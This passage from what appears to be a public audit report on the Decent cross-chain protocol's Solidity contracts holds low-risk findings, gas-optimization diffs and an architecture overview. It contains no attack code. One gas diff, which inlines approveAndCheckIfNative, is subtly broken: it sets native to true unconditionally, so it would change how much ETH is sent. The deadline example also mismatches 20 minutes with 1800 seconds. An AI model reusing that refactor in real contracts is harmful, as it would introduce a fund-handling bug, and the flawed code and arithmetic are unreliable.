File: Uniswapper.sol
function swapExactIn(
        SwapParams memory swapParams, // SwapParams is a struct
        address receiver
    ) public payable routerIsSet returns (uint256 amountOut) {
        swapParams = _receiveAndWrapIfNeeded(swapParams);

        IV3SwapRouter.ExactInputParams memory params = IV3SwapRouter
            .ExactInputParams({
                path: swapParams.path,
                recipient: address(this),
                amountIn: swapParams.amountIn,
                amountOutMinimum: swapParams.amountOut
            });//@audit no deadline specified.

        IERC20(swapParams.tokenIn).approve(uniswap_router, swapParams.amountIn);
        amountOut = IV3SwapRouter(uniswap_router).exactInput(params);

```

### Impact:

Loss of asset through a combination of swap transaction delay and sandwich attack to profit from some slippage due to market swings.

### Recommendation:

Allow users to pass a `deadline` for example 20 minutes in the future at which a swap transaction must fail if it has not been executed.

This is handled by most swap frontends like Uniswap frontend. A user just gets to choose how many minutes in the future should be set as the `deadline` for the swap.
The user can select for example 20 minutes on the frontend and the frontend handles the calculation of the timestamp literal to be supplied to the swap function.

For example deadline is `unix timestamp` + `20 minutes`.
 
`unix timestamp` = `number of seconds from 1970 till the current moment` = `block.timestamp`.
`20 minutes` = 20 * 60.

deadline = 2578383 + 1800  = 2579583 seconds.
 

## [N-01] Lack of address existence check
There are 3 instances of this
- https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/UTBExecutor.sol#L52
- https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/UTBExecutor.sol#L65
- https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/UTBExecutor.sol#L70

The `target` address in the `execute(...)` function was not checked for address existence before making a `.call(...)` to it.

According to Solidity docs: 

> The low-level functions call, delegatecall and staticcall return true as their >first return value if the account called is non-existent, as part of the design of >the EVM. Account existence must be checked prior to calling if needed.

Source: https://docs.soliditylang.org/en/latest/control-structures.html#error-handling-assert-require-revert-and-exceptions

### Impact

If `target` address does not exist, the boolean return value from `.call(...)` will return true when infact the asset was not transferred.

### Recommendation: 

Implement contract existence check before `address.call()`.
```
function doesContractExist(address contractAddress) external view returns (bool) {
        // Check if the contract's code size is greater than zero
        uint256 codeSize;
        assembly {
            codeSize := extcodesize(contractAddress)
        }
        return codeSize > 0;
    }
```

## [N-02] `_sendToRecipient(...)` is unnecessary if the `receiver` is passed as the `receipient` of the swap parameter.

There are 2 instances of this
- https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/swappers/UniSwapper.sol#L130C13-L140C68
- https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/swappers/UniSwapper.sol#L150C13-L168C79

The `swapExactIn(...)` and the `swapExactOut(...)` did a two way movement of output asset by first sending the output asset of the swap to `address(this)` before sending it to the receiver.

It is much more efficient to pass the `receiver` parameter as the `recipient` address in the swap param in order to directly send asset to the `receiver`.

With this there will be no need for the `_sendToRecipient(...)` function since swap output will be sent directly.

```
function swapExactIn(
        SwapParams memory swapParams, // SwapParams is a struct
        address receiver
    ) public payable routerIsSet returns (uint256 amountOut) {
        swapParams = _receiveAndWrapIfNeeded(swapParams);

        IV3SwapRouter.ExactInputParams memory params = IV3SwapRouter
            .ExactInputParams({
                path: swapParams.path,
@>                recipient: address(this),//@audit pass receiver here
                amountIn: swapParams.amountIn,
                amountOutMinimum: swapParams.amountOut
            });

        IERC20(swapParams.tokenIn).approve(uniswap_router, swapParams.amountIn);
        amountOut = IV3SwapRouter(uniswap_router).exactInput(params);

@>        _sendToRecipient(receiver, swapParams.tokenOut, amountOut);
    }

```

### Impact:

Waste of gas and adds more unnecessary codes to the codebase which could open more attack surface for vulnerabilities.

### Recommendation:

Consider passing the `receiver` parameter to the ExactInputParams' `receipient` like in this diff below
```diff
function swapExactIn(...) {
...
  IV3SwapRouter.ExactInputParams memory params = IV3SwapRouter
            .ExactInputParams({
                path: swapParams.path,
--              recipient: address(this),
++              recipient: receiver,
                amountIn: swapParams.amountIn,
                amountOutMinimum: swapParams.amountOut
            });

        IERC20(swapParams.tokenIn).approve(uniswap_router, swapParams.amountIn);
        amountOut = IV3SwapRouter(uniswap_router).exactInput(params);

--      _sendToRecipient(receiver, swapParams.tokenOut, amountOut);
}
```

**[0xsomeone (Judge) commented](https://github.com/code-423n4/2024-01-decent-findings/issues/83#issuecomment-1925955233):**
 > This report is tied with #276 and was selected as the best due to its more curated look, highlighting instances per finding instead of containing only code. 

**[wkantaros (Decent) confirmed](https://github.com/code-423n4/2024-01-decent-findings/issues/83#issuecomment-1942661707)**


***

# Gas Optimizations

For this audit, 6 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2024-01-decent-findings/issues/329) by **c3phas** received the top score from the judge.

*The following wardens also submitted reports: [0x11singh99](https://github.com/code-423n4/2024-01-decent-findings/issues/739), [slvDev](https://github.com/code-423n4/2024-01-decent-findings/issues/485), [hunter\_w3b](https://github.com/code-423n4/2024-01-decent-findings/issues/539), [dharma09](https://github.com/code-423n4/2024-01-decent-findings/issues/97), and [Raihan](https://github.com/code-423n4/2024-01-decent-findings/issues/90).*

# Codebase Optimization Report

## Table of Contents

- [Codebase Optimization Report](#codebase-optimization-report)
  - [Table of Contents](#table-of-contents)
  - [Auditor's Disclaimer](#auditors-disclaimer)
  - [Using immutable on variables that are only set in the constructor and never after (Save 8400 Gas) - Missed by bots](#using-immutable-on-variables-that-are-only-set-in-the-constructor-and-never-after-save-8400-gas---missed-by-bots)
    - [`bridgeToken` should be immutable](#bridgetoken-should-be-immutable)
    - [`executor` should be immutable](#executor-should-be-immutable)
    - [`weth` and `gasCurrencyIsEth` should be immutable](#weth-and-gascurrencyiseth-should-be-immutable)
  - [Unnecessary SLOADs due to how functions are executed](#unnecessary-sloads-due-to-how-functions-are-executed)
  - [Save an entire sload by using short circuiting to our advantage](#save-an-entire-sload-by-using-short-circuiting-to-our-advantage)
  - [Use the memory variable instead of reading the state variable](#use-the-memory-variable-instead-of-reading-the-state-variable)
  - [Unnecessary use of  concat function](#unnecessary-use-of--concat-function)
    - [No need to use concat since we only have one string](#no-need-to-use-concat-since-we-only-have-one-string)
  - [Declare a constant variable for `GAS_FOR_RELAY`](#declare-a-constant-variable-for-gas_for_relay)
  - [Refactor the modifier to save 1 SLOAD(100 Gas)](#refactor-the-modifier-to-save-1-sload100-gas)
  - [Using unchecked blocks to save gas](#using-unchecked-blocks-to-save-gas)
  - [Cache storage values in memory to minimize SLOADs](#cache-storage-values-in-memory-to-minimize-sloads)
    - [router should be cached(saves 1 SLOAD ~100 Gas) - not found by bot](#router-should-be-cachedsaves-1-sload-100-gas---not-found-by-bot)
  - [Unused private functions should be deleted](#unused-private-functions-should-be-deleted)
  - [Conclusion](#conclusion)


## Auditor's Disclaimer 

While we try our best to maintain readability in the provided code snippets, some functions have been truncated to highlight the affected portions.

It's important to note that during the implementation of these suggested changes, developers must exercise caution to avoid introducing vulnerabilities. Although the optimizations have been tested prior to these recommendations, it is the responsibility of the developers to conduct thorough testing again.

Code reviews and additional testing are strongly advised to minimize any potential risks associated with the refactoring process.

_Note: Some titles may be similar to those in the winning bot report but the issues identified were missed by bot submissions._

## Using immutable on variables that are only set in the constructor and never after (Save 8400 Gas) - Missed by bots

Use immutable if you want to assign a permanent value at construction. Use constants if you already know the permanent value. Both get directly embedded in bytecode, saving SLOAD.
Variables only set in the constructor and never edited afterwards should be marked as immutable, as it would avoid the expensive storage-writing operation in the constructor (around 20 000 gas per variable) and replace the expensive storage-reading operations (around 2100 gas per reading) to a less expensive value reading (3 gas).

**Total Instances: 4**
**Gas per instance: 2100**
**Total Saved: 8400 Gas**

https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/bridge_adapters/DecentBridgeAdapter.sol#L19

### `bridgeToken` should be immutable

```solidity
File: /src/bridge_adapters/DecentBridgeAdapter.sol
19:    address bridgeToken;
```

```diff
diff --git a/src/bridge_adapters/DecentBridgeAdapter.sol b/src/bridge_adapters/DecentBridgeAdapter.sol
index 69bf19e..daaf4f8 100644
--- a/src/bridge_adapters/DecentBridgeAdapter.sol
+++ b/src/bridge_adapters/DecentBridgeAdapter.sol
@@ -16,7 +16,7 @@ contract DecentBridgeAdapter is BaseAdapter, IBridgeAdapter {
     mapping(uint256 => uint16) lzIdLookup;
     mapping(uint16 => uint256) chainIdLookup;
     bool gasIsEth;
-    address bridgeToken;
+    address immutable bridgeToken;
```

### `executor` should be immutable

https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L15

```solidity
File: /src/DecentEthRouter.sol
15:    IDecentBridgeExecutor public executor;
```

### `weth` and `gasCurrencyIsEth` should be immutable

https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentBridgeExecutor.sol#L9-L10

```solidity
File: /src/DecentBridgeExecutor.sol
9:    IWETH weth;
10:    bool public gasCurrencyIsEth; // for chains that use ETH as gas currency
```

## Unnecessary SLOADs due to how functions are executed

https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/UTB.sol#L282-L301

```solidity
File: /src/UTB.sol
282:    function callBridge(
283:        uint256 amt2Bridge,
284:        uint bridgeFee,
285:        BridgeInstructions memory instructions
286:    ) private returns (bytes memory) {
287:        bool native = approveAndCheckIfNative(instructions, amt2Bridge);
288:        return
289:            IBridgeAdapter(bridgeAdapters[instructions.bridgeId]).bridge{
290:                value: bridgeFee + (native ? amt2Bridge : 0)
291:            }(
292:                amt2Bridge,
293:                instructions.postBridge,
294:                instructions.dstChainId,
295:                instructions.target,
296:                instructions.paymentOperator,
297:                instructions.payload,
298:                instructions.additionalArgs,
299:                instructions.refund
300:            );
301:    }
```
The above function makes a call to function `approveAndCheckIfNative` whose implementation is as follows:

https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/UTB.sol#L207-L220

```solidity
    function approveAndCheckIfNative(
        BridgeInstructions memory instructions,
        uint256 amt2Bridge
    ) private returns (bool) {
        IBridgeAdapter bridgeAdapter = IBridgeAdapter(bridgeAdapters[instructions.bridgeId]);
        address bridgeToken = bridgeAdapter.getBridgeToken(
            instructions.additionalArgs
        );
        if (bridgeToken != address(0)) {
            IERC20(bridgeToken).approve(address(bridgeAdapter), amt2Bridge);
            return false;
        }
        return true;
    }
```

Now, note that in both functions we are reading the state variable  `IBridgeAdapter(bridgeAdapters[instructions.bridgeId])`.

If we in line the functionality of `approveAndCheckIfNative` inside the function `callBridge` we can avoid making this unnecessary sloads:

```diff
diff --git a/src/UTB.sol b/src/UTB.sol
index 3d05b38..c864b81 100644
--- a/src/UTB.sol
+++ b/src/UTB.sol
@@ -284,9 +284,20 @@ contract UTB is Owned {
         uint bridgeFee,
         BridgeInstructions memory instructions
     ) private returns (bytes memory) {
-        bool native = approveAndCheckIfNative(instructions, amt2Bridge);
+
+        bool native;
+        IBridgeAdapter bridgeAdapter = IBridgeAdapter(bridgeAdapters[instructions.bridgeId]);
+        address bridgeToken = bridgeAdapter.getBridgeToken(
+            instructions.additionalArgs
+        );
+        if (bridgeToken != address(0)) {
+            IERC20(bridgeToken).approve(address(bridgeAdapter), amt2Bridge);
+            native = false;
+        }
+        native = true;
+
         return
-            IBridgeAdapter(bridgeAdapters[instructions.bridgeId]).bridge{
+            bridgeAdapter.bridge{
                 value: bridgeFee + (native ? amt2Bridge : 0)
             }(
                 amt2Bridge,
```

The function `approveAndCheckIfNative` is no longer needed and we can simply delete the code.

## Save an entire sload by using short circuiting to our advantage

*Note, if we implement the immutable finding, then we do not have to do this.*

https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentBridgeExecutor.sol#L68-L82

```solidity
File: /src/DecentBridgeExecutor.sol
68:    function execute(
69:        address from,
70:        address target,
71:        bool deliverEth,
72:        uint256 amount,
73:        bytes memory callPayload
74:    ) public onlyOwner {
75:        weth.transferFrom(msg.sender, address(this), amount);

77:        if (!gasCurrencyIsEth || !deliverEth) {
78:            _executeWeth(from, target, amount, callPayload);
79:        } else {
80:            _executeEth(from, target, amount, callPayload);
81:        }
82:    }
```

The if condition checks the status of `gasCurrencyIsEth` which is a state variable(SLOAD) then depending on the result, it will check `deliverEth` which is a function parameter(mload)
The second check is way cheaper and thus we can use the rules of short circuiting to our advantage

```diff
diff --git a/src/DecentBridgeExecutor.sol b/src/DecentBridgeExecutor.sol
index 1a47cb5..f33e301 100644
--- a/src/DecentBridgeExecutor.sol
+++ b/src/DecentBridgeExecutor.sol
@@ -74,12 +74,12 @@ contract DecentBridgeExecutor is IDecentBridgeExecutor, Owned {
     ) public onlyOwner {
         weth.transferFrom(msg.sender, address(this), amount);

-        if (!gasCurrencyIsEth || !deliverEth) {
+        if (!deliverEth || !gasCurrencyIsEth ) {
             _executeWeth(from, target, amount, callPayload);
         } else {
             _executeEth(from, target, amount, callPayload);
         }
-    }
```

## Use the memory variable instead of reading the state variable

https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/swappers/UniSwapper.sol#L79-L93
```solidity
File: /src/swappers/UniSwapper.sol
79:    function _receiveAndWrapIfNeeded(
80:        SwapParams memory swapParams
81:    ) private returns (SwapParams memory _swapParams) {
82:        if (swapParams.tokenIn != address(0)) {
83:            IERC20(swapParams.tokenIn).transferFrom(
84:                msg.sender,
85:                address(this),
86:                swapParams.amountIn
87:            );
88:            return swapParams;
89:        }
90:        swapParams.tokenIn = wrapped;
91:        IWETH(wrapped).deposit{value: swapParams.amountIn}();
92:        return swapParams;
93:    }
```

```diff
diff --git a/src/swappers/UniSwapper.sol b/src/swappers/UniSwapper.sol
index 929f710..c47e998 100644
--- a/src/swappers/UniSwapper.sol
+++ b/src/swappers/UniSwapper.sol
@@ -88,7 +88,7 @@ contract UniSwapper is UTBOwned, ISwapper {
             return swapParams;
         }
         swapParams.tokenIn = wrapped;
-        IWETH(wrapped).deposit{value: swapParams.amountIn}();
+        IWETH(swapParams.tokenIn).deposit{value: swapParams.amountIn}();
         return swapParams;
     }

```

## Unnecessary use of concat function

https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/bridge_adapters/StargateBridgeAdapter.sol#L154-L161

```solidity
File: /src/bridge_adapters/StargateBridgeAdapter.sol
154:    function getDestAdapter(uint chainId) private view returns (address dstAddr) {
155:        dstAddr = destinationBridgeAdapter[chainId];

157:        require(
158:            dstAddr != address(0),
159:            string.concat("dst chain address not set ")
160:        );
161:    }
```

```diff
diff --git a/src/bridge_adapters/StargateBridgeAdapter.sol b/src/bridge_adapters/StargateBridgeAdapter.sol
index c0339aa..b6b06fd 100644
--- a/src/bridge_adapters/StargateBridgeAdapter.sol
+++ b/src/bridge_adapters/StargateBridgeAdapter.sol
@@ -155,8 +155,7 @@ contract StargateBridgeAdapter is
         dstAddr = destinationBridgeAdapter[chainId];

         require(
-            dstAddr != address(0),
-            string.concat("dst chain address not set ")
+            dstAddr != address(0),"dst chain address not set "
         );
     }
```

### No need to use concat since we only have one string

https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/bridge_adapters/DecentBridgeAdapter.sol#L81-L94

```solidity
File: /src/bridge_adapters/DecentBridgeAdapter.sol
81:    function bridge(
82:        uint256 amt2Bridge,
83:        SwapInstructions memory postBridge,
84:        uint256 dstChainId,
85:        address target,
86:        address paymentOperator,
87:        bytes memory payload,
88:        bytes calldata additionalArgs,
89:        address payable refund
90:    ) public payable onlyUtb returns (bytes memory bridgePayload) {
91:        require(
92:            destinationBridgeAdapter[dstChainId] != address(0),
93:            string.concat("dst chain address not set ")
94:        );
```


```diff
diff --git a/src/bridge_adapters/DecentBridgeAdapter.sol b/src/bridge_adapters/DecentBridgeAdapter.sol
index 69bf19e..b32abe3 100644
--- a/src/bridge_adapters/DecentBridgeAdapter.sol
+++ b/src/bridge_adapters/DecentBridgeAdapter.sol
@@ -90,7 +90,7 @@ contract DecentBridgeAdapter is BaseAdapter, IBridgeAdapter {
     ) public payable onlyUtb returns (bytes memory bridgePayload) {
         require(
             destinationBridgeAdapter[dstChainId] != address(0),
-            string.concat("dst chain address not set ")
+           "dst chain address not set "
         );
```

## Declare a constant variable for `GAS_FOR_RELAY`

https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L96-L97
```solidity
File: /src/DecentEthRouter.sol
96:        uint256 GAS_FOR_RELAY = 100000;
97:        uint256 gasAmount = GAS_FOR_RELAY + _dstGasForCall;
```

```diff
@@ -18,8 +18,9 @@ contract DecentEthRouter is IDecentEthRouter, IOFTReceiverV2, Owned {
     uint8 public constant MT_ETH_TRANSFER_WITH_PAYLOAD = 1;

     uint16 public constant PT_SEND_AND_CALL = 1;
+    uint256 public constant GAS_FOR_RELAY = 100000;
@@ -93,7 +94,7 @@ contract DecentEthRouter is IDecentEthRouter, IOFTReceiverV2, Owned {
             bytes memory payload
         )
     {
-        uint256 GAS_FOR_RELAY = 100000;
+
         uint256 gasAmount = GAS_FOR_RELAY + _dstGasForCall;
         adapterParams = abi.encodePacked(PT_SEND_AND_CALL, gasAmount);
         destBridge = bytes32(abi.encode(destinationBridges[_dstChainId]));
```


## Refactor the modifier to save 1 SLOAD(100 Gas)

https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L60-L65

```solidity
File: /src/DecentEthRouter.sol
60:    modifier userIsWithdrawing(uint256 amount) {
61:        uint256 balance = balanceOf[msg.sender];
62:        require(balance >= amount, "not enough balance");
63:        _;
64:        balanceOf[msg.sender] -= amount;
65:    }
```
We are caching the value of `balanceOf[msg.sender]` on line 61 but due to how we perform the arithmetic operation on line 64, we cannot take advantage of the cached variable(using the short form `-=` utilizes the first variable). We can change this to the long form (`x = x - y`) which would allow us to use the variable `balance` which saves us an entire SLOAD(100 Gas).

```diff
         uint256 balance = balanceOf[msg.sender];
         require(balance >= amount, "not enough balance");
         _;
-        balanceOf[msg.sender] -= amount;
+        balanceOf[msg.sender] = balance - amount;
     }
```


## Using unchecked blocks to save gas

Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn’t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block ([see resource](https://github.com/ethereum/solidity/issues/10695))

https://github.com/decentxyz/decent-bridge/blob/7f90fd4489551b69c20d11eeecb17a3f564afb18/src/DecentEthRouter.sol#L60-L65

```solidity
File: /src/DecentEthRouter.sol
60:    modifier userIsWithdrawing(uint256 amount) {
61:        uint256 balance = balanceOf[msg.sender];
62:        require(balance >= amount, "not enough balance");
63:        _;
64:        balanceOf[msg.sender] -= amount;
65:    }
```
The check on line 62 ensures that the arithmetic operation on line 64 would never overflow since it would only be performed if `balanceOf[msg.sender]` is greater than `amount`.

```diff
@@ -61,7 +61,10 @@ contract DecentEthRouter is IDecentEthRouter, IOFTReceiverV2, Owned {
         uint256 balance = balanceOf[msg.sender];
         require(balance >= amount, "not enough balance");
         _;
-        balanceOf[msg.sender] -= amount;
+        unchecked{
+            balanceOf[msg.sender] -= amount;
+        }
+
     }

```

## Cache storage values in memory to minimize SLOADs

The code can be optimized by minimizing the number of SLOADs.

SLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.

###  router should be cached(saves 1 SLOAD ~100 Gas) - not found by bot

https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/bridge_adapters/DecentBridgeAdapter.sol#L44-L65

```solidity
File: /src/bridge_adapters/DecentBridgeAdapter.sol
55:        return
56:            router.estimateSendAndCallFee(
57:                router.MT_ETH_TRANSFER_WITH_PAYLOAD(),
58:                lzIdLookup[dstChainId],
59:                target,
60:                swapParams.amountIn,
61:                dstGas,
62:                false,
63:                payload
64:            );
```

## Unused private functions should be deleted

https://github.com/code-423n4/2024-01-decent/blob/07ef78215e3d246d47a410651906287c6acec3ef/src/bridge_adapters/StargateBridgeAdapter.sol#L100-L112

```solidity
File: /src/bridge_adapters/StargateBridgeAdapter.sol
100:    function getValue(
101:        bytes calldata additionalArgs,
102:        uint256 amt2Bridge
103:    ) private view returns (uint value) {
104:        (address bridgeToken, LzBridgeData memory lzBridgeData) = abi.decode(
105:            additionalArgs,
106:            (address, LzBridgeData)
107:        );
108:        return
109:            bridgeToken == stargateEth
110:                ? (lzBridgeData.fee + amt2Bridge)
111:                : lzBridgeData.fee;
112:    }
```

## Conclusion

It is important to emphasize that the provided recommendations aim to enhance the efficiency of the code without compromising its readability. We understand the value of maintainable and easily understandable code to both developers and auditors.

As you proceed with implementing the suggested optimizations, please exercise caution and be diligent in conducting thorough testing. It is crucial to ensure that the changes are not introducing any new vulnerabilities and that the desired performance improvements are achieved. Review code changes, and perform thorough testing to validate the effectiveness and security of the refactored code.

Should you have any questions or need further assistance, please don't hesitate to reach out.

**[0xsomeone (Judge) commented](https://github.com/code-423n4/2024-01-decent-findings/issues/329#issuecomment-1925865574):**
 > One of the two reports with no penalties (i.e. incorrect findings), and shows a lot of manual effort was put into this.
> 
> The majority of the gas reports in this audit are statically generated with minimal manual effort, and this particular submission is a welcome exception. I do not have an issue with users relying on automated tools and then post-processing their outputs manually (i.e. like this Warden who may or may not have used tools but has zero invalids).

***

# Audit Analysis

For this audit, 13 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2024-01-decent-findings/issues/667) by **fouzantanveer** received the top score from the judge.

*The following wardens also submitted reports: [yongskiws](https://github.com/code-423n4/2024-01-decent-findings/issues/651), [0xepley](https://github.com/code-423n4/2024-01-decent-findings/issues/648), [SBSecurity](https://github.com/code-423n4/2024-01-decent-findings/issues/618), [SAQ](https://github.com/code-423n4/2024-01-decent-findings/issues/145), [0xSmartContract](https://github.com/code-423n4/2024-01-decent-findings/issues/116), [catellatech](https://github.com/code-423n4/2024-01-decent-findings/issues/115), [0xAadi](https://github.com/code-423n4/2024-01-decent-findings/issues/732), [hunter\_w3b](https://github.com/code-423n4/2024-01-decent-findings/issues/680), [ihtishamsudo](https://github.com/code-423n4/2024-01-decent-findings/issues/617), [foxb868](https://github.com/code-423n4/2024-01-decent-findings/issues/545), [clara](https://github.com/code-423n4/2024-01-decent-findings/issues/237), and [albahaca](https://github.com/code-423n4/2024-01-decent-findings/issues/204).*


## Conceptual Overview 

**Purpose and Functionality:**

Decent is a blockchain-based project designed to simplify and enhance the experience of conducting transactions across multiple blockchain networks. In the ever-growing landscape of blockchain technology, one significant challenge users face is the fragmentation of liquidity and assets across different chains. Decent addresses this by enabling seamless transactions, such as payments or asset transfers, using funds or tokens from any blockchain network.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-01-decent-findings/issues/667).*

**Problem Solving and Need in Web3:**

The primary problem Decent solves is the complexity and inconvenience in managing assets across multiple blockchains. In the current state of Web3, users often have to navigate through a maze of exchanges, wallets, and bridge services to move assets or make payments on different chains. This not only complicates the user experience but also increases the transaction time and cost. Decent streamlines this process, allowing users to interact with various blockchains easily, using a single interface.

**How Decent Works:**
Decent works by aggregating different functionalities like swapping (exchanging one token for another), bridging (transferring tokens from one blockchain to another), and executing transactions on-chain. It allows users to perform actions like minting an NFT or participating in a DeFi protocol on one blockchain while paying with tokens from another chain. For instance, a user can pay with Ethereum on the Ethereum network for a transaction executed on the Polygon network.

**Distinct Features:**
- **Cross-Chain Transactions**: Decent's most notable feature is its ability to facilitate transactions across various blockchains seamlessly. This interoperability is a significant step towards a more integrated and user-friendly blockchain ecosystem.
- **Single-Click Transactions**: Decent simplifies the transaction process to a single click, significantly improving user experience and accessibility.
- **Support for Various Tokens**: The platform is designed to interact with any ERC20 token with liquidity, meaning it can handle a wide range of cryptocurrencies.
- **Interaction with NFTs**: Decent theoretically supports interactions with any ERC721 token, such as NFTs, enabling functionalities like minting through its system.
- **Fee Management**: The platform includes mechanisms to handle transaction fees efficiently, ensuring that the costs are transparent and minimized.

**Insights for Consideration:**

From a non-technical standpoint, Decent represents a significant leap in making blockchain technology more accessible and practical for everyday users. Its ability to bridge the gaps between various blockchains addresses one of the critical pain points in the current blockchain ecosystem – the siloed nature of different networks. By enabling easy cross-chain interactions, Decent not only enhances the user experience but also opens up new possibilities for decentralized applications (dApps) and services that can operate across multiple blockchains.

In essence, Decent can be viewed as a unifying platform that brings coherence to a fragmented blockchain landscape, making it more user-friendly and efficient. This is especially pertinent in the context of the growing DeFi and NFT spaces, where users frequently interact with multiple blockchains. Decent's approach of simplifying these interactions while maintaining security and efficiency is a noteworthy contribution to the Web3 ecosystem.

Let's dive deeper into the architecture of Decent, focusing on the user interaction flow and the interplay between various contracts and functions.

## Architecture

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-01-decent-findings/issues/667).*

Explanation:

**User Interaction: Represents the initial user action that triggers the process.
- UTB Contract: The central contract that receives the user's call.
- Action Determination: The UTB contract determines whether the action is a swap or a bridge.
- Swapper and Bridge Adapter Contracts: Depending on the action, it interacts with either the Swapper or the Bridge Adapter.
- Token Swap and Bridge Logic: The respective contract executes its core logic, either swapping tokens or bridging them to another chain.
- Execution of Transaction: After the swap/bridge, the transaction needs to be executed.
- UTB Executor Contract: This contract is responsible for executing the transaction.
- Transaction Success or Failure: The outcome of the transaction is determined.
- Completion and Reversion Logic: Depending on the outcome, the process either completes the transaction or handles reversion/refunds.
- User Balance/Status Update: Finally, the user's balance or status is updated, and feedback is provided.
**
### Sequence Diagram of important functions

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-01-decent-findings/issues/667).*

This diagram illustrates two key transaction flows in the Decent project:

**swapAndExecute Flow:** The user initiates a swap-and-execute transaction, leading to a series of calls between the UTB, UniSwapper, and UTBExecutor contracts, with fee collection handled by the UTBFeeCollector.

**bridgeAndExecute Flow:** Here, the user initiates a bridge-and-execute transaction. The UTB contract interacts with a BridgeAdapter to handle cross-chain bridging, then executes the transaction via the UTBExecutor, and manages fees with the UTBFeeCollector.


### User Interaction and Contract Workflow in Decent

1. **Starting Point: User Interactions with UTB**
   - The journey typically begins with the user interacting with the `UTB` (Universal Transaction Bridge) contract.
   - **Scenario 1: Swap and Execute**
     - User wants to perform an action (like minting an NFT) on Chain B but wishes to pay with Token A from Chain A.
     - They interact with `swapAndExecute` in `UTB`.
     - **Internal Workflow**:
       - `performSwap`: First, if needed, it swaps Token A to a desired intermediate token (using a registered `ISwapper`, such as `UniSwapper` if Uniswap is involved).
       - `performSwap` calls `swap` on the relevant `ISwapper`, which handles the logic of interacting with a DEX to perform the actual swap.
       - Post swap, `UTB` calls `UTBExecutor` with the swapped token to execute the target action on Chain B.

   - **Scenario 2: Bridge and Execute**
     - User wants to perform a transaction on Chain B using Token A from Chain A without swapping.
     - They call `bridgeAndExecute` in `UTB`.
     - **Internal Workflow**:
       - `swapAndModifyPostBridge`: If any pre-bridge token swap is needed, it's performed here.
       - `callBridge`: This function then calls a bridge operation using a `IBridgeAdapter` like `DecentBridgeAdapter` or `StargateBridgeAdapter`, depending on the chains involved.
       - On the destination chain, the bridged amount is used by `UTBExecutor` to complete the desired action.

2. **Fee Collection**
       - In both scenarios, fees are handled by the `UTBFeeCollector`.
       - The `collectFees` function is called, ensuring that transaction fees are appropriately gathered. The `collectFees` function in the Decent project's `UTBFeeCollector` contract is technically structured to handle the intricacies of fee collection across various transactions. This function is invoked with a `FeeStructure` parameter, which outlines the fee details, including the token type (native or ERC20) and the fee amount. For ERC20 fees, the function executes a `transferFrom` operation, moving the specified fee amount from the user's account to the fee collector. In the case of native currency fees, the collection is handled through direct value transfers within the transaction.
    
    A key technical aspect of `collectFees` is its security and verification process. The function typically includes mechanisms to authenticate the fee structure, possibly using digital signatures to validate that the collected fees align with predetermined criteria or agreements. This verification is crucial for maintaining the integrity of the fee collection process.



3. **Handling Refunds and Failures**
  
      In the Decent project, the mechanism for handling refunds and transaction failures is a crucial aspect of its architecture, particularly given the complexity of cross-chain transactions. The contracts are designed to manage various scenarios where a transaction might not go as planned, necessitating a refund.
      
      When a user initiates a transaction that involves a swap, such as through the `UniSwapper` contract, the system calculates the exact amount of tokens needed for the swap. If there's an excess – for instance, if the actual amount required for the swap is less than the user provided – the contract is designed to automatically refund the surplus to the user. This process is managed within the swapping contract itself, ensuring that users only spend what is necessary for their transaction.
      
      In the context of bridging operations, managed by contracts like the `DecentBridgeAdapter`, the refund mechanism is slightly more complex due to the nature of cross-chain transactions. If a transaction fails after the assets have been bridged to the destination chain, the protocol must ensure that these assets are either returned to the user's original chain or held securely until the user can retrieve them. The bridge contract, therefore, includes logic to detect transaction failures on the destination chain and initiate the appropriate refund process.
      
      The overarching `UTB` (Universal Transaction Bridge) contract plays a critical role in orchestrating these operations. It oversees the entire transaction flow – from initiating swaps or bridges to executing the final transaction step. If a failure occurs at any point in this flow, the `UTB` contract is responsible for triggering the necessary refund actions. This could involve coordinating with the involved swapper or bridge adapter contracts to ensure that the user’s funds are safely returned.
    
